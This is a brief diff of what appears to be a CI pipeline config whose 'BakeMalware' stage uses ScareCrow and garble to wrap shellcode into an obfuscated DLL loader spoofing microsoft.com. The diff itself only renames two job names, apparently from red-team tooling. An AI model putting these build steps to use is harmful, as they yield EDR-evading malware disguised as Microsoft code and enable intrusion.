@@ -17,7 +17,7 @@ PreProcess:
             mkdir -p /payloads/${CI_COMMIT_SHORT_SHA}/.lib
             ln -s /usr/local/bin/garble /payloads/${CI_COMMIT_SHORT_SHA}/.lib/garble
 
-ScareCrow:
+ScareCrow01:
     stage: BakeMalware
     tags:
         - maas
@@ -26,7 +26,7 @@ ScareCrow:
             cd /payloads/${CI_COMMIT_SHORT_SHA}
             ScareCrow -I $CI_PROJECT_DIR/shellcode/shellcode_x64.bin -Loader dll -domain microsoft.com
 
-ScareCrow:
+ScareCrow02:
     stage: BakeMalware
     tags:
         - maas
